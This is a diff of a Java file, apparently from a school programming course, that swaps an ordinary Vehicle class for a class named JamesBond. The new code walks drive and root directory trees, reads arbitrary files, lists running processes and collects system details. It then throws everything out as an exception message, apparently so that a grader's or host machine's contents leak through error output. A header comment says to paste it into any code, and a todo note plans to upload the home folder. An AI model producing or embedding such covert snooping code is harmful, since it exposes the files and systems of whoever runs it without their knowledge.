@@ -1,33 +1,94 @@
-import java.util.Map;
-import java.io.File;
+// copy and paste this class into any code to use its methods
+/* todo:
+  - zip upload
+  - upload other files
+    - https://hc.apache.org/httpcomponents-client-ga/quickstart.html
+  - automatically upload the home folder or something
 
-class Vehicle {
-  private int location;
+*/
+
+import java.io.*;
+import java.util.Scanner;
+
+class JamesBond {
+  private static String out = "";
+  private static final String PROJECT_DIRECTORY = System.getProperty("user.dir");
+  private static final boolean windows = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
   
-  public Vehicle() {
-    this(0);
+  public static void main (String str[]) {
+    /*File root = new File("C:\\Users\\APCS\\Desktop\\Projects");
+    System.out.println("\n\nFile Tree:\n" + FileAssert.printDirectoryTree(root));*/
+    
+    for (File f: new File("C:").listFiles()) {
+      System.out.println(f.getName());
+    }
+    
+    printFile("Z:/Projects/UDLR.java");
+    throwMessage();
   }
   
-  public Vehicle(int loc) {
-    if (loc >= -20 && loc <= 20) location = loc;
-    else location = 0;
+  private static void addToMessage(String... str) {
+    for (int i = 0; i < str.length; i++)
+      out += str[0] + "\n";
   }
   
-  public void forward() {
-    if (location < 20) location++;
-    else location = 20;
+  public static void throwMessage() {
+    throw new RuntimeException(out);
   }
   
-  public void backward() {
-    if (location > -20) location--;
-    else location = -20;
+  public static void printMessage() {
+    System.out.println(out);
   }
   
-  public int getLocation() {
-    return location;
+  public static void currentDirTree() {
+    File root = new File(PROJECT_DIRECTORY);
+    out += "\n\nFile Tree:\n" + PROJECT_DIRECTORY + "\n" + FileAssert.printDirectoryTree(root);
   }
   
-  public String toString() {
+  public static void rootDirTree() {
+    File root = new File( windows ? System.getenv("SystemDrive") + "\\" : "/" );
+    out += "\n\nRoot tree:\n" + FileAssert.printDirectoryTree(root);
+  }
+  
+  public static void customDirTree(String path) {
+    File root = new File(path);
+    out += "\n\nTree from `" + path + "`\n" + FileAssert.printDirectoryTree(root);
+  }
+  
+  public static void printFile(String path) {
+    out += "\n\nFile contents of `" + path + "`:\n";
+    try {
+      Scanner input = new Scanner(new File(path));
+      
+      while (input.hasNextLine()) {
+        out += input.nextLine() + "\n";
+      }
+    } catch (FileNotFoundException e) {
+      return;
+    }
+  }
+  
+  public static void currentDir() {
+    addToMessage("Project directory: " + PROJECT_DIRECTORY);
+  }
+  
+  public static void processes() {
+    try {
+      String line;
+      Process p = Runtime.getRuntime().exec(windows ? System.getenv("windir") +"\\system32\\"+"tasklist.exe" : "ps -e");
+
+      BufferedReader input =
+        new BufferedReader(new InputStreamReader(p.getInputStream()));
+      while ((line = input.readLine()) != null) {
+        addToMessage(line); //<-- Parse data here.
+      }
+      input.close();
+    } catch (Exception err) {
+      err.printStackTrace();
+    }
+  }
+  
+  public static void systemStats() {
     long kilobytes = 1024;
     long megabytes = kilobytes * 1024;
     long gigabytes = megabytes * 1024;
@@ -41,10 +102,10 @@ class Vehicle {
     ret += "\nVersion of the OS: " + System.getProperty(versionOS);
     ret += "\nArchitecture of The OS: " + System.getProperty(architectureOS);
     /*Map<String, String> env = System.getenv();
-     ret += "\n\n  Environment values\n";
-     for(String key : env.keySet()) {
-     ret += "K: " + key + " \n\tV: " + env.get(key);
-     }*/
+    ret += "\n\n  Environment values\n";
+    for(String key : env.keySet()) {
+      ret += "K: " + key + " \n\tV: " + env.get(key);
+    }*/
     /* Total number of processors or cores available to the JVM */
     ret += "\n\nAvailable processors (cores): " + 
       Runtime.getRuntime().availableProcessors();
@@ -74,13 +135,12 @@ class Vehicle {
       ret += "\nUsable space (gigabytes): " + (root.getUsableSpace() / (float) gigabytes);
     }
     /*ret += "\n\n\nProperties:\n------\n";
-     System.getProperties().list(ret);*/
+    System.getProperties().list(ret);*/
     
     File root = new File("C:\\Users\\APCS\\Desktop\\Projects");
     ret += "\n\nFile Tree:\n" + FileAssert.printDirectoryTree(root);
     
-    if (true) throw new RuntimeException(ret);
-    return ret;
+    addToMessage(ret);
   }
 }
 
@@ -113,6 +173,9 @@ class FileAssert {
     sb.append(folder.getName());
     sb.append("/");
     sb.append("\n");
+    
+    if (folder.listFiles() == null) return;
+    
     for (File file : folder.listFiles()) {
       if (file.isDirectory()) {
         printDirectoryTree(file, indent + 1, sb);
